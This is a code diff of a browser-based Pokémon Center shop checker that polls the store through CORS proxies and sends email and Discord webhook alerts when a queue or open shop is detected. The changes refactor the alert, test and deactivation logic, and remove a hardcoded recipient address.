+        removeButton.className = 'remove-email-button';
         removeButton.textContent = 'Remove';
         emailInputGroup.appendChild(removeButton);
         removeButton.addEventListener('click', function() {
           emailInputGroup.remove();
-          showFeedback('Email removed.');
+          showEmailFeedback('Email removed.');
         });
-        showFeedback('Email submitted.');
+        showEmailFeedback('Email submitted.');
         console.log('Submitted email:', email);
       });
       console.log('Added new email input field');
-      showFeedback('Email field added.');
+      showEmailFeedback('Email field added.');
     }
+
     document.addEventListener('DOMContentLoaded', () => {
-      const initialInputGroup = emailInputsContainer.querySelector('.input-group');
+      const initialInputGroup = emailInputsContainer.querySelector('.email-input-group');
       const initialInput = initialInputGroup.querySelector('.email-input');
-      initialInput.required = true;
+      const submitButton = initialInputGroup.querySelector('.submit-email-button');
+      submitButton.addEventListener('click', function() {
+        const email = initialInput.value.trim();
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          alert('Please enter a valid email address.');
+          initialInput.focus();
+          return;
+        }
+        initialInput.setAttribute('readonly', 'true');
+        submitButton.remove();
+        const removeButton = document.createElement('button');
+        removeButton.type = 'button';
+        removeButton.className = 'remove-email-button';
+        removeButton.textContent = 'Remove';
+        initialInputGroup.appendChild(removeButton);
+        removeButton.addEventListener('click', function() {
+          initialInputGroup.remove();
+          showEmailFeedback('Email removed.');
+        });
+        showEmailFeedback('Email submitted.');
+        console.log('Submitted email:', email);
+      });
     });
+
     addEmailButton.addEventListener('click', addEmailInputField);
+
     function formatDuration(ms) {
       const seconds = Math.floor(ms / 1000);
       const hours = Math.floor(seconds / 3600);
@@ -495,18 +562,21 @@
       const secs = seconds % 60;
       return `${hours}h ${minutes}m ${secs}s`;
     }
+
     function updateRunTime() {
       if (startTime) {
         const now = Date.now();
         runTime.textContent = formatDuration(now - startTime);
       }
     }
+
     function startTimer() {
       if (!startTime) {
         startTime = Date.now();
         timerInterval = setInterval(updateRunTime, 2000);
       }
     }
+
     function stopTimer() {
       if (timerInterval) {
         clearInterval(timerInterval);
@@ -515,6 +585,7 @@
       startTime = null;
       runTime.textContent = '0h 0m 0s';
     }
+
     function playThreeBeeps() {
       let beepCount = 0;
       const beepInterval = setInterval(() => {
@@ -530,64 +601,49 @@
       }, 1500);
     }
 
-    async function sendDiscordWebhook(status, details) {
-        if (!discordNotificationsEnabled) {
-            console.log('Discord webhook notifications are disabled; skipping.');
-            return;
-        }
+    // --- New Discord Webhook Function ---
+    async function sendDiscordWebhook(status, details) {
+      if (!webhookNotificationsEnabled || !discordWebhookURL) {
+        console.log('Discord webhook notifications are disabled or URL is missing; skipping webhook.');
+        return;
+      }
 
-        const webhookUrl = webhookInput.value.trim();
-        if (!webhookUrl || !webhookInput.hasAttribute('readonly')) {
-            console.warn('No valid or submitted Discord Webhook URL found. Skipping webhook alert.');
-            return;
-        }
+      const payload = {
+        username: "Pokémon Center Checker Bot",
+        avatar_url: "https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/25.png", // Pikachu
+        embeds: [{
+          title: `🚨 Pokémon Center Status Alert: ${status}`,
+          description: details,
+          color: status.includes('accessible') || status.includes('in queue') || status.includes('Test') ? 3066993 : 15158332, // Green/Red
+          fields: [
+            { name: "Timestamp", value: new Date().toLocaleString(), inline: true },
+            { name: "Link", value: "[Go to Pokémon Center](https://www.pokemoncenter.com/)", inline: true }
+          ],
+          thumbnail: {
+            url: "https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png"
+          }
+        }]
+      };
 
-        let color = 16711680; // Red for errors/not accessible (0xFF0000)
-        let iconUrl = 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png';
-        if (status.includes('accessible') || status.includes('queue')) {
-            color = 65280; // Green for accessible (0x00FF00)
-        } else if (status.includes('Test')) {
-            color = 16776960; // Yellow for test (0xFFFF00)
-        }
+      try {
+        const response = await fetch(discordWebhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
 
-        const payload = {
-            content: status === 'Shop is accessible!' ? '@everyone The Pokémon Center Shop is OPEN!' : status.includes('queue') ? '@everyone Pokémon Center Queue Detected!' : null,
-            embeds: [{
-                title: status,
-                description: details,
-                color: color,
-                timestamp: new Date().toISOString(),
-                footer: {
-                    text: 'Pokémon Center Shop Access Checker',
-                    icon_url: iconUrl
-                },
-                fields: [{
-                    name: 'Status Time',
-                    value: new Date().toLocaleTimeString(),
-                    inline: true
-                }]
-            }]
-        };
-
-        try {
-            const response = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload),
-            });
-
-            if (response.ok) {
-                console.log('Discord Webhook sent successfully.');
-            } else {
-                const responseBody = await response.text();
-                console.error('Failed to send Discord Webhook:', response.status, responseBody);
-            }
-        } catch (error) {
-            console.error('Error sending Discord Webhook:', error);
-        }
-    }
+        if (response.ok) {
+          console.log('Discord webhook sent successfully.');
+        } else {
+          console.error('Failed to send Discord webhook. Status:', response.status);
+          const errorText = await response.text();
+          console.error('Discord Webhook Error Details:', errorText);
+        }
+      } catch (error) {
+        console.error('Error sending Discord webhook:', error);
+      }
+    }
+    // --- End New Discord Webhook Function ---
 
     function sendEmail(status, details, recipientEmails) {
       if (!emailNotificationsEnabled) {
@@ -617,12 +673,36 @@
           (error) => console.error('Failed to send email to', email, ':', error)
         );
       });
+      
+      // ORIGINAL LOGIC: Deactivate after sending alert
+      emailNotificationsEnabled = false;
+      emailToggleButton.textContent = 'Activate Email Alerts';
+      emailToggleButton.classList.remove('active', 'bg-green-500');
+      emailToggleButton.classList.add('inactive', 'bg-gray-500');
+      showEmailFeedback('Email notifications deactivated after sending alert.');
     }
+
+    // --- New Alert Deactivation Logic ---
+    function deactivateAlerts() {
+      // Deactivate Email
+      emailNotificationsEnabled = false;
+      emailToggleButton.textContent = 'Activate Email Alerts';
+      emailToggleButton.classList.remove('active', 'bg-green-500');
+      emailToggleButton.classList.add('inactive', 'bg-gray-500');
+      // Deactivate Webhook
+      webhookNotificationsEnabled = false;
+      webhookToggleButton.textContent = 'Activate Discord Alerts';
+      webhookToggleButton.classList.remove('active', 'bg-green-500');
+      webhookToggleButton.classList.add('inactive', 'bg-gray-500');
+      showEmailFeedback('All alerts deactivated after sending alert.');
+    }
+    // --- End New Alert Deactivation Logic ---
+
     function testEmail() {
       const emailInputs = document.querySelectorAll('.email-input');
-      const recipientEmails = ['kronborgnielsen@gmail.com'];
+      const recipientEmails = [];
       let hasValidEmail = true;
-      Array.from(emailInputs).slice(1).forEach((input, index) => {
+      Array.from(emailInputs).forEach((input, index) => {
         const email = input.value.trim();
         if (email && input.hasAttribute('readonly')) {
           if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
@@ -637,35 +717,66 @@
       if (!hasValidEmail) {
         return;
       }
-      if (recipientEmails.length === 0 && !discordNotificationsEnabled) {
-        console.warn('No valid alert methods provided.');
-        alert('No valid email or Discord alerts provided/enabled.');
+      if (recipientEmails.length === 0) {
+        console.warn('No valid email addresses provided.');
+        alert('No valid email addresses provided.');
         return;
       }
-      if (emailNotificationsEnabled && typeof emailjs === 'undefined') {
+      if (!emailNotificationsEnabled) {
+        console.warn('Email notifications are disabled; cannot send test email.');
+        alert('Email notifications are disabled. Please activate email notifications to send a test email.');
+        return;
+      }
+      if (typeof emailjs === 'undefined') {
         alert('Email functionality is unavailable. Please check your network connection and try again.');
         return;
       }
-      
-      const testStatus = 'Test Alert: Everything is OK';
-      const testDetails = 'This is a test notification from the Pokémon Center Shop Access Checker.';
-
-      if (emailNotificationsEnabled && recipientEmails.length > 0) {
-        console.log('Sending test email to:', recipientEmails);
-        sendEmail(testStatus, testDetails, recipientEmails);
-      } else {
-          console.warn('Skipping test email: No valid emails or emails disabled.');
-      }
-
-      if (discordNotificationsEnabled && webhookInput.hasAttribute('readonly')) {
-          console.log('Sending test Discord webhook.');
-          sendDiscordWebhook(testStatus, testDetails);
-      } else {
-          console.warn('Skipping test Discord webhook: No valid webhook or webhooks disabled.');
-      }
-
-      alert('Test alert(s) sent! Check your inbox(es)/Discord channel(s).');
+      console.log('Sending test email to:', recipientEmails);
+      // We temporarily set email notifications to true for the test, then rely on the sendEmail
+      // to reset it to false or we can just call the original sendEmail and it will reset
+      // the state.
+      let originalState = emailNotificationsEnabled;
+      emailNotificationsEnabled = true;
+      sendEmail('Test Email', 'This is a test email from Pokémon Center Shop Access Checker.', recipientEmails);
+      // Restore the original state, since we don't want to disable after a test
+      emailNotificationsEnabled = originalState;
+      if(originalState) {
+        emailToggleButton.textContent = 'Deactivate Email Alerts';
+        emailToggleButton.classList.remove('inactive', 'bg-gray-500');
+        emailToggleButton.classList.add('active', 'bg-green-500');
+      }
+      alert('Test email(s) sent! Check your inbox(es) (and spam/junk folder).');
     }
+
+    // --- New Test Webhook Function ---
+    function testWebhook() {
+      if (!discordWebhookURL || !discordWebhookURL.startsWith('https://discord.com/api/webhooks/')) {
+        alert('Please enter and submit a valid Discord Webhook URL first.');
+        return;
+      }
+      if (!webhookNotificationsEnabled) {
+        alert('Discord notifications are disabled. Please activate Discord notifications to send a test webhook.');
+        return;
+      }
+      
+      // We temporarily set webhook notifications to true for the test
+      let originalState = webhookNotificationsEnabled;
+      webhookNotificationsEnabled = true;
+
+      sendDiscordWebhook('Test Webhook Alert', 'This is a test message from your Pokémon Center Shop Access Checker!').then(() => {
+        // Restore the original state, since we don't want to disable after a test
+        webhookNotificationsEnabled = originalState;
+        if(originalState) {
+          webhookToggleButton.textContent = 'Deactivate Discord Alerts';
+          webhookToggleButton.classList.remove('inactive', 'bg-gray-500');
+          webhookToggleButton.classList.add('active', 'bg-green-500');
+        }
+        alert('Test webhook sent! Check your Discord channel.');
+      });
+    }
+    // --- End New Test Webhook Function ---
+
+
     function extractQueueLength(text) {
       const patterns = [
         /(\d+)\s*users?\s*ahead/i,
@@ -679,19 +790,25 @@
       }
       return null;
     }
+
     async function checkShopAccess() {
       const emailInputs = document.querySelectorAll('.email-input');
-      const currentEmails = ['kronborgnielsen@gmail.com'];
+      const currentEmails = [];
       Array.from(emailInputs)
-        .slice(1)
         .filter(input => input.hasAttribute('readonly'))
         .map(input => input.value.trim())
         .filter(email => email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
         .forEach(email => currentEmails.push(email));
+      
       console.log('Emails for notifications:', currentEmails);
-      if (currentEmails.length === 0 && !discordNotificationsEnabled) {
-        console.warn('No valid alert methods active. Skipping alerts for this check.');
+      
+      if (currentEmails.length === 0 && emailNotificationsEnabled) {
+        console.warn('No valid email addresses provided, disabling email alerts for this run.');
       }
+      if (!discordWebhookURL && webhookNotificationsEnabled) {
+        console.warn('No Discord Webhook URL provided, disabling webhook alerts for this run.');
+      }
+
       try {
         const proxies = [
           'https://corsproxy.io/?',
@@ -702,10 +819,12 @@
           'https://www.pokemoncenter.com/',
           'https://www.pokemoncenter.com/category/trading-card-game'
         ];
+        
         let response = null;
         let proxyUsed = '';
         let urlUsed = '';
         let proxyErrors = [];
+        
         for (const targetUrl of targetUrls) {
           for (const proxy of proxies) {
             try {
@@ -727,78 +846,105 @@
           }
           if (response && response.ok && response.status === 200) break;
         }
+
         const now = new Date().toLocaleTimeString();
         lastChecked.textContent = now;
+
         if (!response || !response.ok) {
           const status = 'Proxy error';
           const details = `Failed to fetch page through all proxies. Errors: ${proxyErrors.join('; ')}. Please check the site manually.`;
           statusText.textContent = status;
-          statusText.style.color = 'var(--color-danger)';
+          statusText.classList.remove('text-green-500');
+          statusText.classList.add('text-red-500');
+          statusDetails.textContent = details;
           playThreeBeeps();
-          sendEmail(status, details, currentEmails);
-          sendDiscordWebhook(status, details);
+          
+          if (statusText.dataset.previousStatus !== status) {
+            if (emailNotificationsEnabled) sendEmail(status, details, currentEmails);
+            if (webhookNotificationsEnabled) sendDiscordWebhook(status, details);
+            deactivateAlerts(); // Deactivate both after sending
+          }
           statusText.dataset.previousStatus = status;
           return;
         }
+
         const finalUrl = decodeURIComponent(response.url.replace(proxyUsed, ''));
         const text = await response.text();
         const isQueue =
           /queue-it\.net/i.test(finalUrl) ||
           /waiting room|queue-it|waitingroom|virtual waiting/i.test(text);
+
         if (isQueue) {
           const queueLength = extractQueueLength(text);
           const currentStatus = 'Shop is active (in queue)';
           statusText.textContent = currentStatus;
-          statusText.style.color = 'var(--color-success)';
+          statusText.classList.remove('text-red-500');
+          statusText.classList.add('text-green-500');
           const details = `Queue detected at ${finalUrl} (checked ${urlUsed}). Queue length: ${queueLength || 'unknown'}. Redirecting to Pokémon Center homepage.`;
           statusDetails.textContent = details;
           playThreeBeeps();
+          
+          // Notify and stop/redirect
           if (statusText.dataset.previousStatus !== currentStatus) {
-              sendEmail(currentStatus, details, currentEmails);
-              sendDiscordWebhook(currentStatus, details);
+            if (emailNotificationsEnabled) sendEmail(currentStatus, details, currentEmails);
+            if (webhookNotificationsEnabled) sendDiscordWebhook(currentStatus, details);
+            deactivateAlerts(); // Deactivate both after sending
           }
           statusText.dataset.previousStatus = currentStatus;
           stopChecking();
           window.location.href = 'https://www.pokemoncenter.com/';
           return;
+
         } else if (/pokemoncenter\.com(\/|$|\/category\/trading-card-game)/i.test(finalUrl)) {
           const hasShopContent = /shop|products|category|store|cart|new releases|all products|add to cart|merchandise|collectibles|plush|trading card|Pokémon/i.test(text);
           const hasDynamicElements = /<nav\b|<a\b[^>]*href=["'][^"']*product[^"']*["']|<div\b[^>]*class=["'][^"']*product[^"']*["']/i.test(text);
           const isLargeResponse = text.length > 10000;
+          
           if (hasShopContent || hasDynamicElements || isLargeResponse) {
             const currentStatus = 'Shop is accessible!';
             statusText.textContent = currentStatus;
-          statusText.style.color = 'var(--color-success)';
-            const details = `Reached ${finalUrl} (checked ${urlUsed}), shop content detected (keywords or dynamic elements present). Response length: ${text.length} chars.`;
-            statusDetails.textContent = details;
+            statusText.classList.remove('text-red-500');
+            statusText.classList.add('text-green-500');
+            statusDetails.textContent = `Reached ${finalUrl} (checked ${urlUsed}), shop content detected (keywords or dynamic elements present). Response length: ${text.length} chars.`;
+            
+            // Notify if status changes to accessible
             if (statusText.dataset.previousStatus !== currentStatus) {
-                sendEmail(currentStatus, statusDetails.textContent, currentEmails);
-                sendDiscordWebhook(currentStatus, statusDetails.textContent);
+              playThreeBeeps();
+              if (emailNotificationsEnabled) sendEmail(currentStatus, statusDetails.textContent, currentEmails);
+              if (webhookNotificationsEnabled) sendDiscordWebhook(currentStatus, statusDetails.textContent);
+              deactivateAlerts(); // Deactivate both after sending
             }
             statusText.dataset.previousStatus = currentStatus;
+          
           } else {
             const currentStatus = 'Shop is not accessible (landing page)';
             statusText.textContent = currentStatus;
-          statusText.style.color = 'var(--color-danger)';
+            statusText.classList.remove('text-green-500');
+            statusText.classList.add('text-red-500');
             const details = `Reached ${finalUrl} (checked ${urlUsed}), but no shop content or dynamic elements found. Likely a static landing page. Response length: ${text.length} chars.`;
             statusDetails.textContent = details;
             playThreeBeeps();
+            
             if (statusText.dataset.previousStatus !== currentStatus) {
-                sendEmail(currentStatus, details, currentEmails);
-                sendDiscordWebhook(currentStatus, details);
+              if (emailNotificationsEnabled) sendEmail(currentStatus, details, currentEmails);
+              if (webhookNotificationsEnabled) sendDiscordWebhook(currentStatus, details);
+              deactivateAlerts(); // Deactivate both after sending
             }
             statusText.dataset.previousStatus = currentStatus;
           }
         } else {
           const currentStatus = 'Shop is not accessible (unexpected page)';
           statusText.textContent = currentStatus;
-          statusText.style.color = 'var(--color-danger)';
+          statusText.classList.remove('text-green-500');
+          statusText.classList.add('text-red-500');
           const details = `Reached ${finalUrl} (checked ${urlUsed}), but it does not appear to be the Pokémon Center shop. Response length: ${text.length} chars.`;
           statusDetails.textContent = details;
           playThreeBeeps();
+
           if (statusText.dataset.previousStatus !== currentStatus) {
-              sendEmail(currentStatus, details, currentEmails);
-              sendDiscordWebhook(currentStatus, details);
+            if (emailNotificationsEnabled) sendEmail(currentStatus, details, currentEmails);
+            if (webhookNotificationsEnabled) sendDiscordWebhook(currentStatus, details);
+            deactivateAlerts(); // Deactivate both after sending
           }
           statusText.dataset.previousStatus = currentStatus;
         }
@@ -807,61 +953,64 @@
         const status = 'Site is down';
         const details = `Failed to fetch: ${error.message}. Please check the site manually.`;
         statusText.textContent = status;
-        statusText.style.color = 'var(--color-danger)';
+        statusText.classList.remove('text-green-500');
+        statusText.classList.add('text-red-500');
         statusDetails.textContent = details;
         lastChecked.textContent = new Date().toLocaleTimeString();
         playThreeBeeps();
+
         if (statusText.dataset.previousStatus !== status) {
-            sendEmail(status, details, currentEmails);
-            sendDiscordWebhook(status, details);
+          if (emailNotificationsEnabled) sendEmail(status, details, currentEmails);
+          if (webhookNotificationsEnabled) sendDiscordWebhook(status, details);
+          deactivateAlerts(); // Deactivate both after sending
         }
         statusText.dataset.previousStatus = status;
       }
     }
+
     function startChecking() {
       const emailInputs = document.querySelectorAll('.email-input');
-      const webhookUrl = webhookInput.value.trim();
-      let allAlertsConfigured = true;
+      let allEmailsValid = true;
+      let hasAtLeastOneEmail = false;
+      
+      // Check Webhook submission
+      if (discordWebhookURL && !discordWebhookInput.hasAttribute('readonly')) {
+        alert('Please submit the Discord Webhook URL before starting.');
+        discordWebhookInput.focus();
+        return;
+      }
 
-      Array.from(emailInputs).forEach((input) => {
+      // Check Emails
+      Array.from(emailInputs).forEach((input, index) => {
         const email = input.value.trim();
         if (email && !input.hasAttribute('readonly')) {
-          alert('Please submit all additional email addresses before starting.');
+          alert('Please submit all email addresses before starting.');
           input.focus();
-          allAlertsConfigured = false;
+          allEmailsValid = false;
         } else if (email && input.hasAttribute('readonly')) {
-          if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-            alert(`Please ensure email is valid: ${email}`);
+          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+            hasAtLeastOneEmail = true;
+          } else {
+            alert(`Please ensure email ${index + 1} is valid: ${email}`);
             input.focus();
-            allAlertsConfigured = false;
+            allEmailsValid = false;
           }
         }
       });
+      
+      if (!allEmailsValid) {
+        return;
+      }
+      if (!hasAtLeastOneEmail && !discordWebhookURL) {
+        console.warn('No valid email or webhook provided.');
+        alert('Please submit at least one valid email address OR a Discord Webhook URL.');
+        return;
+      }
 
-      if (webhookUrl && !webhookInput.hasAttribute('readonly')) {
-        alert('Please submit the Discord Webhook URL before starting.');
-        webhookInput.focus();
-        allAlertsConfigured = false;
-      }
-      
-      if (!allAlertsConfigured) {
-        return;
-      }
-      const currentEmails = ['kronborgnielsen@gmail.com'];
-      Array.from(emailInputs)
-        .slice(1)
-        .filter(input => input.hasAttribute('readonly'))
-        .map(input => input.value.trim())
-        .filter(email => email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
-        .forEach(email => currentEmails.push(email));
-      if (currentEmails.length === 0 && !webhookInput.hasAttribute('readonly')) {
-        console.warn('No valid email or Discord webhook configured.');
-        alert('Please configure at least one valid email or a Discord webhook before starting.');
-        return;
-      }
       if (intervalId) {
         clearTimeout(intervalId);
       }
+      
       function scheduleNextCheck() {
         currentCheckInterval = parseInt(frequencySlider.value) * 60 * 1000;
         const randomizedInterval = getRandomInterval(currentCheckInterval);
@@ -871,14 +1020,17 @@
           scheduleNextCheck();
         }, randomizedInterval);
       }
+      
       checkShopAccess();
       scheduleNextCheck();
+      
       startButton.classList.add('hidden');
       stopButton.classList.remove('hidden');
       statusText.textContent = 'Checking...';
       statusDetails.textContent = 'Started checking with randomized intervals.';
       startTimer();
     }
+
     function stopChecking() {
       if (intervalId) {
         clearTimeout(intervalId);
@@ -886,14 +1038,15 @@
         startButton.classList.remove('hidden');
         stopButton.classList.add('hidden');
         statusText.textContent = 'Stopped.';
-        statusText.style.color = 'var(--color-text-dark)'; // Reset color
         statusDetails.textContent = 'Checking stopped.';
         stopTimer();
       }
     }
+
     startButton.addEventListener('click', startChecking);
     stopButton.addEventListener('click', stopChecking);
     testEmailButton.addEventListener('click', testEmail);
+    testWebhookButton.addEventListener('click', testWebhook);
   </script>
 </body>
 </html>
